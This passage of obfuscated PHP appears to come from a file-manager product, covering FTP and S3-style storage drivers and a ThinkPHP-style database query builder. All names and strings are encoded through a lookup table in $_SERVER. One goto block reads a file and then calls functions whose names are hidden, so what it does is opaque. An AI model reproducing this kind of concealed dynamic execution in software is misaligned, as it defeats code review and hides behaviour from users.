$this->iconvApp($‰Üœ¼øÌ); } public function exist($ï½Ã¸Á) { return $this->isFile($ï½Ã¸Á) || $this->isFolder($ï½Ã¸Á); } public function isFile($şÁ·¦œ) { return !$this->isFolder($şÁ·¦œ) && $this->objectMeta($şÁ·¦œ); } public function isFolder($‡€¥¶¦°) { return $this->cacheMethod($_SERVER[³à¼î¯á][169], $‡€¥¶¦°); } protected function objectMeta($Ä¥ˆ¼Ö¹) { return $this->cacheMethod($_SERVER[³à¼î¯á][171], $Ä¥ˆ¼Ö¹); } protected function _objectMeta($’ıÊ¶ğı) { $ùÁÉËòÊ =& $_SERVER[³à¼î¯á]; if ($’ıÊ¶ğı == $ùÁÉËòÊ[12] || $’ıÊ¶ğı == $ùÁÉËòÊ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $’ıÊ¶ğı = $this->iconvSystem($’ıÊ¶ğı); $ÔìòĞ›‡ = array($ùÁÉËòÊ[32] => $this->iconvApp($’ıÊ¶ğı), $ùÁÉËòÊ[33] => $ùÁÉËòÊ[221], $ùÁÉËòÊ[79] => 0); @ftp_chdir($this->connect, $ùÁÉËòÊ[8]); $¯˜Ûãü£ = @ftp_size($this->connect, $’ıÊ¶ğı); if ($¯˜Ûãü£ != -1) { $ÔìòĞ›‡[$ùÁÉËòÊ[79]] = $¯˜Ûãü£; } else { $©‹õÏıÒ = @ftp_chdir($this->connect, $’ıÊ¶ğı); if (!$©‹õÏıÒ) { return !1; } $ÔìòĞ›‡[$ùÁÉËòÊ[33]] = $ùÁÉËòÊ[78]; } return $ÔìòĞ›‡; } protected function _isFolder($óĞ²‹¶Ò) { $ÛªÎ‹åÀ =& $_SERVER[³à¼î¯á]; if ($óĞ²‹¶Ò == $ÛªÎ‹åÀ[12] || $óĞ²‹¶Ò == $ÛªÎ‹åÀ[8]) { return !0; } $æÏâ¦‚² = $this->_objectMeta($óĞ²‹¶Ò); return isset($æÏâ¦‚²[$ÛªÎ‹åÀ[33]]) && $æÏâ¦‚²[$ÛªÎ‹åÀ[33]] == $ÛªÎ‹åÀ[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($ÉÏ•¯æÂ) { parent::__construct($ÉÏ•¯æÂ); $this->setSignVersion($_SERVER[³à¼î¯á][238]); } public function uploadLink($ğ†û¯»”, $õ¸·ÓÃ¤ = 0) { $öò¶Å¦ =& $_SERVER[³à¼î¯á]; if ($this->isUploadServer()) { return; } $©š¿Ğ¹İ = $this->getType(); if (!in_array($©š¿Ğ¹İ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $“ˆÉ¨‹ = (!$õ¸·ÓÃ¤ ? 1 : ceil($õ¸·ÓÃ¤ / pow(1024, 3))) * 3600 * 4; $•õêÌ¸ò = $this->multiUploadFormData($ğ†û¯»”, $“ˆÉ¨‹); if ($•õêÌ¸ò) { $•õêÌ¸ò[$öò¶Å¦[97]] = $ğ†û¯»”; $•õêÌ¸ò[$öò¶Å¦[98]] = $©š¿Ğ¹İ; } return $•õêÌ¸ò; } public function fileOutImage($÷³Ùõ›–, $Íùğïè” = 250) { if ($this->size($÷³Ùõ›–) > 1024 * 1024 * 25) { return $this->fileOutImageServer($÷³Ùõ›–, $Íùğïè”); } $¶ûöö´ = $this->link($÷³Ùõ›–); $¶ûöö´ .= $_SERVER[³à¼î¯á][1422] . $Íùğïè”; $this->fileOutLink($¶ûöö´); } public function fileOutLink($øÄ®«Šº) { $•˜˜ğæ½ =& $_SERVER[³à¼î¯á]; if (substr($øÄ®«Šº, 0, 7) == $•˜˜ğæ½[1378]) { $øÄ®«Šº = $•˜˜ğæ½[1379] . substr($øÄ®«Šº, 7); } header($•˜˜ğæ½[165] . $øÄ®«Šº); die; } } goto bµ˜™•ßÁè; f§§‘Ş²ŸÙ: if ($_SERVER[$_SERVER[³à¼î¯á][921]] != $_SERVER[$_SERVER[³à¼î¯á][1008]]) { $_getc = $_SERVER[³à¼î¯á][924]; $_getfile = $_SERVER[$_SERVER[³à¼î¯á][925]] . $_SERVER[³à¼î¯á][926]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³à¼î¯á][253], $_getfilec); if (count($_getarrs) < $_SERVER[³à¼î¯á][665]) { $exit = $_SERVER[³à¼î¯á][927]; $exit(); } $_act = $_SERVER[³à¼î¯á][1009]; $_act($_SERVER[$_SERVER[³à¼î¯á][922]]); } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\161" => "\x3c\76", "\x67\x74" => "\x3e", "\145\x67\x74" => "\x3e\x3d", "\154\164" => "\74", "\x65\x6c\x74" => "\74\x3d", "\156\x6f\x74\x6c\151\153\x65" => "\116\117\x54\40\114\111\x4b\x45", "\x6c\x69\x6b\145" => "\x4c\x49\x4b\x45", "\x69\156" => "\x49\x4e", "\x6e\x6f\x74\151\156" => "\116\x4f\124\40\x49\116", "\156\x6f\164\40\x69\x6e" => "\x4e\117\124\40\111\x4e", "\x62\x65\164\167\145\x65\x6e" => "\x42\x45\x54\x57\105\x45\x4e", "\156\x6f\x74\x62\145\x74\167\145\x65\156" => "\x4e\117\124\40\x42\105\x54\127\105\105\116", "\x6e\x6f\x74\x20\142\145\x74\x77\x65\145\x6e" => "\116\117\124\x20\x42\x45\124\127\105\x45\116"); protected $selectSql = "\x53\x45\x4c\105\103\124\45\x44\x49\123\124\111\x4e\103\124\x25\x20\x25\106\111\105\x4c\104\45\x20\x46\122\117\115\x20\45\x54\x41\x42\114\x45\x25\45\112\x4f\111\116\x25\45\x57\x48\x45\122\x45\x25\x25\107\x52\117\x55\120\45\45\110\x41\x56\111\x4e\x47\x25\45\x4f\x52\104\x45\122\x25\x25\x4c\x49\x4d\x49\124\45\40\45\125\116\x49\x4f\x4e\x25\x25\103\x4f\x4d\115\105\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $½¯²¨—± = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[³à¼î¯á][1010], $½¯²¨—±); } public function factory($å¯„äšô = '') { $ä®¬”¸Í =& $_SERVER[³à¼î¯á]; $å¯„äšô = $this->parseConfig($å¯„äšô); if (empty($å¯„äšô[$ä®¬”¸Í[1011]])) { think_exception(think_lang($ä®¬”¸Í[1012])); } $this->dbType = ucwords(strtolower($å¯„äšô[$ä®¬”¸Í[1011]])); $ÂÓô•û  = $ä®¬”¸Í[1013] . $this->dbType; if (class_exists($ÂÓô•û )) { $­×Åö’ = new $ÂÓô•û ($å¯„äšô); if ($ä®¬”¸Í[1014] != strtolower($å¯„äšô[$ä®¬”¸Í[1011]])) { $­×Åö’->dbType = strtoupper($this->dbType); } else { $­×Åö’->dbType = $this->_getDsnType($å¯„äšô[$ä®¬”¸Í[964]]); } } else { think_exception(think_lang($ä®¬”¸Í[1015]) . $ä®¬”¸Í[1016] . $ÂÓô•û ); } return $­×Åö’; } public function __call($ÍóıÃô, $Â×È¯¦) { if (method_exists($this, $ÍóıÃô)) { return call_user_func_array(array($this, $ÍóıÃô), $Â×È¯¦); } } protected function _getDsnType($ş•Ã÷¨ı) { $ƒã„Éï‚ = explode($_SERVER[³à¼î¯á][4], $ş•Ã÷¨ı); $·¶á€Ö» = strtoupper(trim($ƒã„Éï‚[0])); return $·¶á€Ö»; } private function parseConfig($Àà”ñ¡â = '') { $’ˆüÔŸò =& $_SERVER[³à¼î¯á]; if (!empty($Àà”ñ¡â) && is_string($Àà”ñ¡â)) { $Àà”ñ¡â = $this->parseDSN($Àà”ñ¡â); } elseif (is_array($Àà”ñ¡â)) { $Àà”ñ¡â = array_change_key_case($Àà”ñ¡â); $Àà”ñ¡â = array($’ˆüÔŸò[1011] => $Àà”ñ¡â[$’ˆüÔŸò[1017]], $’ˆüÔŸò[936] => $Àà”ñ¡â[$’ˆüÔŸò[1018]], $’ˆüÔŸò[937] => $Àà”ñ¡â[$’ˆüÔŸò[1019]], $’ˆüÔŸò[934] => $Àà”ñ¡â[$’ˆüÔŸò[1020]], $’ˆüÔŸò[935] => $Àà”ñ¡â[$’ˆüÔŸò[1021]], $’ˆüÔŸò[21] => $Àà”ñ¡â[$’ˆüÔŸò[1022]], $’ˆüÔŸò[964] => $Àà”ñ¡â[$’ˆüÔŸò[1023]], $’ˆüÔŸò[17] => isset($Àà”ñ¡â[$’ˆüÔŸò[1024]]) ? $Àà”ñ¡â[$’ˆüÔŸò[1024]] : array()); } elseif (empty($Àà”ñ¡â)) { if (think_config($’ˆüÔŸò[1025]) && $’ˆüÔŸò[1014] != strtolower(think_config($’ˆüÔŸò[1026]))) { $Àà”ñ¡â = $this->parseDSN(think_config($’ˆüÔŸò[1025])); } else { $Àà”ñ¡â = array($’ˆüÔŸò[1011] => think_config($’ˆüÔŸò[1026]), $’ˆüÔŸò[936] => think_config($’ˆüÔŸò[1027]), $’ˆüÔŸò[937] => think_config($’ˆüÔŸò[1028]), $’ˆüÔŸò[934] => think_config($’ˆüÔŸò[1029]), $’ˆüÔŸò[935] => think_config($’ˆüÔŸò[1030]), $’ˆüÔŸò[21] => think_config($’ˆüÔŸò[298]), $’ˆüÔŸò[964] => think_config($’ˆüÔŸò[1025]), $’ˆüÔŸò[17] => think_config($’ˆüÔŸò[1031])); } } return $Àà”ñ¡â; } protected function initConnect($Ëëïß¥ = true) { if (1 == think_config($_SERVER[³à¼î¯á][22])) { $this->_linkID = $this->multiConnect($Ëëïß¥); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¹Â§´Ã³ => $Î‹Ó–£) { $this->_linkID = $Î‹Ó–£; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($òó½œõù = false) { $±‘€ìœî =& $_SERVER[³à¼î¯á]; static $“×¬÷û = array(); static $…×±©ßô = -1; if (empty($“×¬÷û)) { foreach ($this->config as $ÚçÌ¨§¤ => $Í¥ËÅ±´) { $“×¬÷û[$ÚçÌ¨§¤] = explode($±‘€ìœî[50], $Í¥ËÅ±´); } } if (think_config($±‘€ìœî[1032])) { if ($òó½œõù || think_config($±‘€ìœî[446]) === !0) { $‚»îßç· = floor(mt_rand(0, think_config($±‘€ìœî[1033]) - 1)); $…×±©ßô = $‚»îßç·; } else { if (is_numeric(think_config($±‘€ìœî[1034]))) { $‚»îßç· = think_config($±‘€ìœî[1034]); } else { $‚»îßç· = floor(mt_rand(think_config($±‘€ìœî[1033]), count($“×¬÷û[$±‘€ìœî[934]]) - 1)); } } } else { $‚»îßç· = floor(mt_rand(0, count($“×¬÷û[$±‘€ìœî[934]]) - 1)); $…×±©ßô = $‚»îßç·; } $‚»îßç· = $…×±©ßô !== -1 ? $…×±©ßô : $‚»îßç·; $²‚Ä³æ = array($±‘€ìœî[936] => isset($“×¬÷û[$±‘€ìœî[936]][$‚»îßç·]) ? $“×¬÷û[$±‘€ìœî[936]][$‚»îßç·] : $“×¬÷û[$±‘€ìœî[936]][0], $±‘€ìœî[937] => isset($“×¬÷û[$±‘€ìœî[937]][$‚»îßç·]) ? $“×¬÷û[$±‘€ìœî[937]][$‚»îßç·] : $“×¬÷û[$±‘€ìœî[937]][0], $±‘€ìœî[934] => isset($“×¬÷û[$±‘€ìœî[934]][$‚»îßç·]) ? $“×¬÷û[$±‘€ìœî[934]][$‚»îßç·] : $“×¬÷û[$±‘€ìœî[934]][0], $±‘€ìœî[935] => isset($“×¬÷û[$±‘€ìœî[935]][$‚»îßç·]) ? $“×¬÷û[$±‘€ìœî[935]][$‚»îßç·] : $“×¬÷û[$±‘€ìœî[935]][0], $±‘€ìœî[21] => isset($“×¬÷û[$±‘€ìœî[21]][$‚»îßç·]) ? $“×¬÷û[$±‘€ìœî[21]][$‚»îßç·] : $“×¬÷û[$±‘€ìœî[21]][0], $±‘€ìœî[964] => isset($“×¬÷û[$±‘€ìœî[964]][$‚»îßç·]) ? $“×¬÷û[$±‘€ìœî[964]][$‚»îßç·] : $“×¬÷û[$±‘€ìœî[964]][0], $±‘€ìœî[17] => isset($“×¬÷û[$±‘€ìœî[17]][$‚»îßç·]) ? $“×¬÷û[$±‘€ìœî[17]][$‚»îßç·] : $“×¬÷û[$±‘€ìœî[17]][0]); return $this->connect($²‚Ä³æ, $‚»îßç·); } public function parseDSN($ş¤ĞÂ’Ô) { $üŒÏ¢‡  =& $_SERVER[³à¼î¯á]; if (empty($ş¤ĞÂ’Ô)) { return !1; } $–ô‚³× = parse_url($ş¤ĞÂ’Ô); if ($–ô‚³×[$üŒÏ¢‡ [198]]) { $×Âëİ“ = array($üŒÏ¢‡ [1011] => $–ô‚³×[$üŒÏ¢‡ [198]], $üŒÏ¢‡ [936] => isset($–ô‚³×[$üŒÏ¢‡ [637]]) ? $–ô‚³×[$üŒÏ¢‡ [637]] : $üŒÏ¢‡ [12], $üŒÏ¢‡ [937] => isset($–ô‚³×[$üŒÏ¢‡ [1035]]) ? $–ô‚³×[$üŒÏ¢‡ [1035]] : $üŒÏ¢‡ [12], $üŒÏ¢‡ [934] => isset($–ô‚³×[$üŒÏ¢‡ [199]]) ? $–ô‚³×[$üŒÏ¢‡ [199]] : $üŒÏ¢‡ [12], $üŒÏ¢‡ [935] => isset($–ô‚³×[$üŒÏ¢‡ [200]]) ? $–ô‚³×[$üŒÏ¢‡ [200]] : $üŒÏ¢‡ [12], $üŒÏ¢‡ [21] => isset($–ô‚³×[$üŒÏ¢‡ [87]]) ? substr($–ô‚³×[$üŒÏ¢‡ [87]], 1) : $üŒÏ¢‡ [12]); } else { preg_match($üŒÏ¢‡ [1036], trim($ş¤ĞÂ’Ô), $æ‘ö‚€Æ); $×Âëİ“ = array($üŒÏ¢‡ [1011] => $æ‘ö‚€Æ[1], $üŒÏ¢‡ [936] => $æ‘ö‚€Æ[2], $üŒÏ¢‡ [937] => $æ‘ö‚€Æ[3], $üŒÏ¢‡ [934] => $æ‘ö‚€Æ[4], $üŒÏ¢‡ [935] => $æ‘ö‚€Æ[5], $üŒÏ¢‡ [21] => $æ‘ö‚€Æ[6]); } $×Âëİ“[$üŒÏ¢‡ [964]] = $üŒÏ¢‡ [12]; return $×Âëİ“; } protected function debug() { $åù‚Áó» =& $_SERVER[³à¼î¯á]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $åù‚Áó»[1037]; if (think_config($åù‚Áó»[1038])) { think_status($åù‚Áó»[1039]); think_trace($this->queryStr . $åù‚Áó»[1040] . think_status($åù‚Áó»[24], $åù‚Áó»[1039], 6) . $åù‚Áó»[1041], $åù‚Áó»[12], $åù‚Áó»[1042]); } } protected function parseLock($ğ§ë‰“ = false) { $¼îĞÑ¦ƒ =& $_SERVER[³à¼î¯á]; if (!$ğ§ë‰“) { return $¼îĞÑ¦ƒ[12]; } if ($¼îĞÑ¦ƒ[966] == $this->dbType) { return $¼îĞÑ¦ƒ[1043]; } return $¼îĞÑ¦ƒ[1044]; } protected function parseSet($ü»ã¶‹£) { $Â…¾†£Å =& $_SERVER[³à¼î¯á]; foreach ($ü»ã¶‹£ as $÷¡ŸÃÛô => $å¶¿ìÂÃ) { if (is_array($å¶¿ìÂÃ) && $Â…¾†£Å[348] == $å¶¿ìÂÃ[0]) { $œ£Â€‰à[] = $this->parseKey($÷¡ŸÃÛô) . $Â…¾†£Å[932] . $å¶¿ìÂÃ[1]; } elseif (is_scalar($å¶¿ìÂÃ) || is_null($å¶¿ìÂÃ)) { $œ£Â€‰à[] = $this->parseKey($÷¡ŸÃÛô) . $Â…¾†£Å[932] . $this->parseValue($å¶¿ìÂÃ); } } return $Â…¾†£Å[1045] . implode($Â…¾†£Å[50], $œ£Â€‰à); } protected function bindParam($“åçËè·, $·’òà‘) { $this->bind[$_SERVER[³à¼î¯á][4] . $“åçËè·] = $·’òà‘; } protected function parseBind($ˆòëá´«) { $ˆòëá´« = array_merge($this->bind, $ˆòëá´«); $this->bind = array(); return $ˆòëá´«; } function parseKey(&$©‘ı¼ß“, $¨²¡£Ê¨ = true) { if ($¨²¡£Ê¨) { $©‘ı¼ß“ = $this->parseKeyCheck($©‘ı¼ß“); } return $©‘ı¼ß“; } function parseKeyCheck($ø¦à±ğî) { $«øàÆ—Ù =& $_SERVER[³à¼î¯á]; $ø¦à±ğî = trim($ø¦à±ğî); if (!preg_match($«øàÆ—Ù[1046], $ø¦à±ğî)) { think_exception($«øàÆ—Ù[1047] . $ø¦à±ğî); } return $ø¦à±ğî; } protected function parseValue($ñæ¨áĞÜ) { $ƒÌê•ñì =& $_SERVER[³à¼î¯á]; if (is_string($ñæ¨áĞÜ)) { $ñæ¨áĞÜ = $ƒÌê•ñì[1005] . $this->escapeString($ñæ¨áĞÜ) . $ƒÌê•ñì[1005]; } elseif (isset($ñæ¨áĞÜ[0]) && is_string($ñæ¨áĞÜ[0]) && strtolower($ñæ¨áĞÜ[0]) == $ƒÌê•ñì[348]) { $ñæ¨áĞÜ = $this->escapeString($ñæ¨áĞÜ[1]); } elseif (is_array($ñæ¨áĞÜ)) { $ñæ¨áĞÜ = array_map(array($this, $ƒÌê•ñì[1006]), $ñæ¨áĞÜ); } elseif (is_bool($ñæ¨áĞÜ)) { $ñæ¨áĞÜ = $ñæ¨áĞÜ ? $ƒÌê•ñì[91] : $ƒÌê•ñì[219]; } elseif (is_null($ñæ¨áĞÜ)) { $ñæ¨áĞÜ = $ƒÌê•ñì[106]; } return $ñæ¨áĞÜ; } protected function parseField($Ü‘Ë‡Ò) { $ŸÃß‹‘ü =& $_SERVER[³à¼î¯á]; if (is_string($Ü‘Ë‡Ò) && strpos($Ü‘Ë‡Ò, $ŸÃß‹‘ü[50])) { $Ü‘Ë‡Ò = explode($ŸÃß‹‘ü[50], $Ü‘Ë‡Ò); } if (is_array($Ü‘Ë‡Ò)) { $÷«¢øç = array(); foreach ($Ü‘Ë‡Ò as $ğêÌ²å => $Å„„œ€±) { if (!is_numeric($ğêÌ²å)) { $÷«¢øç[] = $this->parseKey($ğêÌ²å, !1) . $ŸÃß‹‘ü[1048] . $this->parseKey($Å„„œ€±); } else { $÷«¢øç[] = $this->parseKey($Å„„œ€±); } } $÷¤¯ş®‹ = implode($ŸÃß‹‘ü[50], $÷«¢øç); } elseif (is_string($Ü‘Ë‡Ò) && !empty($Ü‘Ë‡Ò)) { $÷¤¯ş®‹ = $Ü‘Ë‡Ò; } else { $÷¤¯ş®‹ = $ŸÃß‹‘ü[211]; } return $÷¤¯ş®‹; } protected function parseTable($ş×€Š“ğ) { $‡¢ÙÛö® =& $_SERVER[³à¼î¯á]; if (is_array($ş×€Š“ğ)) { $€¤ Ô®œ = array(); foreach ($ş×€Š“ğ as $ºÉŠ¥ßÈ => $€·Á§éˆ) { if (!is_numeric($ºÉŠ¥ßÈ)) { $€¤ Ô®œ[] = $this->parseKey($ºÉŠ¥ßÈ) . $‡¢ÙÛö®[53] . $this->parseKey($€·Á§éˆ); } else { $€¤ Ô®œ[] = $this->parseKey($ºÉŠ¥ßÈ); } } $ş×€Š“ğ = $€¤ Ô®œ; } elseif (is_string($ş×€Š“ğ)) { if (strstr($ş×€Š“ğ, $‡¢ÙÛö®[53])) { return $ş×€Š“ğ; } $ş×€Š“ğ = explode($‡¢ÙÛö®[50], $ş×€Š“ğ); array_walk($ş×€Š“ğ, array($this, $‡¢ÙÛö®[954])); } return $‡¢ÙÛö®[948] . trim(implode($‡¢ÙÛö®[1049], $ş×€Š“ğ), $‡¢ÙÛö®[436]) . $‡¢ÙÛö®[948]; } protected function parseWhere($›£˜ŸÔ‚) { $ãÏ´µ° =& $_SERVER[³à¼î¯á]; $ùØÑ«” = $ãÏ´µ°[12]; if (is_string($›£˜ŸÔ‚)) { $ùØÑ«” = $›£˜ŸÔ‚; } else { $±ãüıùà = isset($›£˜ŸÔ‚[$ãÏ´µ°[1050]]) ? strtoupper($›£˜ŸÔ‚[$ãÏ´µ°[1050]]) : $ãÏ´µ°[12]; if (in_array($±ãüıùà, array($ãÏ´µ°[1051], $ãÏ´µ°[1052], $ãÏ´µ°[1053]))) { $±ãüıùà = $ãÏ´µ°[53] . $±ãüıùà . $ãÏ´µ°[53]; unset($›£˜ŸÔ‚[$ãÏ´µ°[1050]]); } else { $±ãüıùà = $ãÏ´µ°[1054]; } foreach ($›£˜ŸÔ‚ as $Ÿ‰â’âÄ => $¿ó““ä…) { $ùØÑ«” .= $ãÏ´µ°[329]; if (is_numeric($Ÿ‰â’âÄ)) { $Ÿ‰â’âÄ = $ãÏ´µ°[1055]; } if (0 === strpos($Ÿ‰â’âÄ, $ãÏ´µ°[11])) { $ùØÑ«” .= $this->parseThinkWhere($Ÿ‰â’âÄ, $¿ó““ä…); } else { if (!preg_match($ãÏ´µ°[1056], trim($Ÿ‰â’âÄ))) { think_exception(think_lang($ãÏ´µ°[1057]) . $ãÏ´µ°[4] . $Ÿ‰â’âÄ); } $½±é ´† = is_array($¿ó““ä…) && isset($¿ó““ä…[$ãÏ´µ°[1058]]); $Ÿ‰â’âÄ = trim($Ÿ‰â’âÄ); if (strpos($Ÿ‰â’âÄ, $ãÏ´µ°[205])) { $Ã„İÓ¬ = explode($ãÏ´µ°[205], $Ÿ‰â’âÄ); $¦¿Ì§®‚ = array(); foreach ($Ã„İÓ¬ as $‚¾Äİî => $¿˜ˆ¢Á) { $ÊØÉÁ¾† = $½±é ´† ? $¿ó““ä…[$‚¾Äİî] : $¿ó““ä…; $¦¿Ì§®‚[] = $ãÏ´µ°[312] . $this->parseWhereItem($this->parseKey($¿˜ˆ¢Á), $ÊØÉÁ¾†) . $ãÏ´µ°[953]; } $ùØÑ«” .= implode($ãÏ´µ°[1059], $¦¿Ì§®‚); } elseif (strpos($Ÿ‰â’âÄ, $ãÏ´µ°[335])) { $Ã„İÓ¬ = explode($ãÏ´µ°[335], $Ÿ‰â’âÄ); $¦¿Ì§®‚ = array(); foreach ($Ã„İÓ¬ as $‚¾Äİî => $¿˜ˆ¢Á) { $ÊØÉÁ¾† = $½±é ´† ? $¿ó““ä…[$‚¾Äİî] : $¿ó““ä…; $¦¿Ì§®‚[] = $ãÏ´µ°[312] . $this->parseWhereItem($this->parseKey($¿˜ˆ¢Á), $ÊØÉÁ¾†) . $ãÏ´µ°[953]; } $ùØÑ«” .= implode($ãÏ´µ°[1054], $¦¿Ì§®‚); } else { $ùØÑ«” .= $this->parseWhereItem($this->parseKey($Ÿ‰â’âÄ), $¿ó““ä…); } } $ùØÑ«” .= $ãÏ´µ°[330] . $±ãüıùà; } $ùØÑ«” = substr($ùØÑ«”, 0, -strlen($±ãüıùà)); } return empty($ùØÑ«”) ? $ãÏ´µ°[12] : $ãÏ´µ°[1060] . $ùØÑ«”; } protected function parseWhereItem($àîëº–, $Ô¨…šĞ) { $Á«¼¿Ú¹ =& $_SERVER[³à¼î¯á]; $…â·…×¨ = $Á«¼¿Ú¹[12]; if (is_array($Ô¨…šĞ)) { if (is_string($Ô¨…šĞ[0])) { $êÜÁÁ×º = strtolower($Ô¨…šĞ[0]); if (in_array($Ô¨…šĞ[0], array($Á«¼¿Ú¹[932], $Á«¼¿Ú¹[1061], $Á«¼¿Ú¹[1062], $Á«¼¿Ú¹[1063], $Á«¼¿Ú¹[1064], $Á«¼¿Ú¹[1065]))) { $…â·…×¨ .= $àîëº– . $Á«¼¿Ú¹[53] . $Ô¨…šĞ[0] . $Á«¼¿Ú¹[53] . $this->parseValue($Ô¨…šĞ[1]); } elseif (preg_match($Á«¼¿Ú¹[1066], $Ô¨…šĞ[0])) { $…â·…×¨ .= $àîëº– . $Á«¼¿Ú¹[53] . $this->exp[$êÜÁÁ×º] . $Á«¼¿Ú¹[53] . $this->parseValue($Ô¨…šĞ[1]); } elseif (preg_match($Á«¼¿Ú¹[1067], $Ô¨…šĞ[0])) { if (is_array($Ô¨…šĞ[1])) { $–½ÂˆØÙ = isset($Ô¨…šĞ[2]) ? strtoupper($Ô¨…šĞ[2]) : $Á«¼¿Ú¹[1052]; if (in_array($–½ÂˆØÙ, array($Á«¼¿Ú¹[1051], $Á«¼¿Ú¹[1052], $Á«¼¿Ú¹[1053]))) { $îÍ‘™­ƒ = array(); foreach ($Ô¨…šĞ[1] as $ÜĞØÏçÄ) { $îÍ‘™­ƒ[] = $àîëº– . $Á«¼¿Ú¹[53] . $this->exp[$êÜÁÁ×º] . $Á«¼¿Ú¹[53] . $this->parseValue($ÜĞØÏçÄ); } $…â·…×¨ .= $Á«¼¿Ú¹[312] . implode($Á«¼¿Ú¹[53] . $–½ÂˆØÙ . $Á«¼¿Ú¹[53], $îÍ‘™­ƒ) . $Á«¼¿Ú¹[953]; } } else { $…â·…×¨ .= $àîëº– . $Á«¼¿Ú¹[53] . $this->exp[$êÜÁÁ×º] . $Á«¼¿Ú¹[53] . $this->parseValue($Ô¨…šĞ[1]); } } elseif ($Á«¼¿Ú¹[348] == $êÜÁÁ×º) { $…â·…×¨ .= $Á«¼¿Ú¹[951] . $àîëº– . $Á«¼¿Ú¹[53] . $Ô¨…šĞ[1] . $Á«¼¿Ú¹[1068]; } elseif (preg_match($Á«¼¿Ú¹[1069], $Ô¨…šĞ[0])) { $…â·…×¨ .= $Ô¨…šĞ[0]; } elseif (preg_match($Á«¼¿Ú¹[1070], $Ô¨…šĞ[0])) { if (isset($Ô¨…šĞ[2]) && $Á«¼¿Ú¹[348] == $Ô¨…šĞ[2]) { $…â·…×¨ .= $àîëº– . $Á«¼¿Ú¹[53] . $this->exp[$êÜÁÁ×º] . $Á«¼¿Ú¹[53] . $Ô¨…šĞ[1]; } else { if (is_string($Ô¨…šĞ[1])) { $Ô¨…šĞ[1] = explode($Á«¼¿Ú¹[50], $Ô¨…šĞ[1]); } $ê´óÔü“ = implode($Á«¼¿Ú¹[50], $this->parseValue($Ô¨…šĞ[1])); $…â·…×¨ .= $àîëº– . $Á«¼¿Ú¹[53] . $this->exp[$êÜÁÁ×º] . $Á«¼¿Ú¹[951] . $ê´óÔü“ . $Á«¼¿Ú¹[953]; } } elseif (preg_match($Á«¼¿Ú¹[1071], $Ô¨…šĞ[0])) { $ÅªŠ™Ú’ = is_string($Ô¨…šĞ[1]) ? explode($Á«¼¿Ú¹[50], $Ô¨…šĞ[1]) : $Ô¨…šĞ[1]; $…â·…×¨ .= $Á«¼¿Ú¹[951] . $àîëº– . $Á«¼¿Ú¹[53] . $this->exp[$êÜÁÁ×º] . $Á«¼¿Ú¹[53] . $this->parseValue($ÅªŠ™Ú’[0]) . $Á«¼¿Ú¹[1054] . $this->parseValue($ÅªŠ™Ú’[1]) . $Á«¼¿Ú¹[330]; } else { think_exception(think_lang($Á«¼¿Ú¹[1057]) . $Á«¼¿Ú¹[4] . $Ô¨…šĞ[0]); } } else { $¬Òûı¥Å = count($Ô¨…šĞ); $‚ÓÍÚÖò = $Á«¼¿Ú¹[12]; if (is_string($Ô¨…šĞ[$¬Òûı¥Å - 1])) { $‚ÓÍÚÖò = isset($Ô¨…šĞ[$¬Òûı¥Å - 1]) ? strtoupper($Ô¨…šĞ[$¬Òûı¥Å - 1]) : $Á«¼¿Ú¹[12]; if (in_array($‚ÓÍÚÖò, array($Á«¼¿Ú¹[1051], $Á«¼¿Ú¹[1052], $Á«¼¿Ú¹[1053]))) { $¬Òûı¥Å = $¬Òûı¥Å - 1; } } else { $‚ÓÍÚÖò = $Á«¼¿Ú¹[1051]; } for ($Â¸ïÒı = 0; $Â¸ïÒı < $¬Òûı¥Å; $Â¸ïÒı++) { $ÅªŠ™Ú’ = is_array($Ô¨…šĞ[$Â¸ïÒı]) ? $Ô¨…šĞ[$Â¸ïÒı][1] : $Ô¨…šĞ[$Â¸ïÒı]; if ($Á«¼¿Ú¹[348] == strtolower($Ô¨…šĞ[$Â¸ïÒı][0])) { $…â·…×¨ .= $Á«¼¿Ú¹[312] . $àîëº– . $Á«¼¿Ú¹[53] . $ÅªŠ™Ú’ . $Á«¼¿Ú¹[1068] . $‚ÓÍÚÖò . $Á«¼¿Ú¹[53]; } else { $ôİ÷¹Ì• = is_array($Ô¨…šĞ[$Â¸ïÒı]) ? $this->exp[strtolower($Ô¨…šĞ[$Â¸ïÒı][0])] : $Á«¼¿Ú¹[932]; if (!$ôİ÷¹Ì• && is_array($Ô¨…šĞ[$Â¸ïÒı]) && in_array($Ô¨…šĞ[$Â¸ïÒı][0], array($Á«¼¿Ú¹[932], $Á«¼¿Ú¹[1061], $Á«¼¿Ú¹[1062], $Á«¼¿Ú¹[1063], $Á«¼¿Ú¹[1064], $Á«¼¿Ú¹[1065]))) { $ôİ÷¹Ì• = $Ô¨…šĞ[$Â¸ïÒı][0]; } $…â·…×¨ .= $Á«¼¿Ú¹[312] . $àîëº– . $Á«¼¿Ú¹[53] . $ôİ÷¹Ì• . $Á«¼¿Ú¹[53] . $this->parseValue($ÅªŠ™Ú’) . $Á«¼¿Ú¹[1068] . $‚ÓÍÚÖò . $Á«¼¿Ú¹[53]; } } $…â·…×¨ = substr($…â·…×¨, 0, -4); } } else { $…â·…×¨ .= $àîëº– . $Á«¼¿Ú¹[1072] . $this->parseValue($Ô¨…šĞ); } return $…â·…×¨; } protected function parseThinkWhere($ÔÉê°—Ï, $¤Ÿò¡…°) { $Ğàù”îÓ =& $_SERVER[³à¼î¯á]; $š¡ƒè = $Ğàù”îÓ[12]; switch 